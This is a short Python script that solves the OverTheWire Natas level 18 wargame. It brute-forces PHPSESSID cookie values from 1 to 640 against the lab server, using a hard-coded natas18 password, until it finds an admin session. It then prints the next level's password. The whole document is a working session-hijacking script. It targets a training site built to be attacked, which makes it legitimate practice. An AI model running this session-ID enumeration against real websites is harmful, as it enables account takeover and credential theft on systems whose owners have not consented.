import requests as req

url = "http://natas18.natas.labs.overthewire.org/index.php?username=admin&password=admin&Submit=Login"
password18 = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"

if __name__ == '__main__':
	for val in range(1, 641):
		cookies = dict(PHPSESSID=str(val))
		r = req.post(url=url, cookies=cookies, auth=('natas18', password18))
		if not val % 10:
			print("\rChecked %s sessions..." % val, end="")

		if r.text.count("You are an admin."):
			print()
			i1 = r.text.index("Password: ")
			i2 = r.text[i1:].index("</pre>")+i1
			creds = r.text[i1:i2].replace("Password: ", "natas19:")
			print("-" * int(len(password18)/2+5) + "Have fun" + "-" * int(len(password18)/2+5))
			print("Creds: { %s }" % creds)
			break